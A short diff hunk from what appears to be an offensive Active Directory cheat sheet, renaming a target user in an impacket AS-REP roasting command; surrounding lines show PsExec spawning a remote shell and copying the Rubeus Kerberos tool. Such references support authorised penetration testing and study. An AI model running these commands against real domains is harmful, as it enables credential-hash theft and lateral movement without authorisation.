@@ -4139,7 +4139,7 @@ PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
 ````
 ##### AS-REP Roasting
 ````
-impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast example.com/pete
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast example.com/USERP
 ````
 ````
 cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
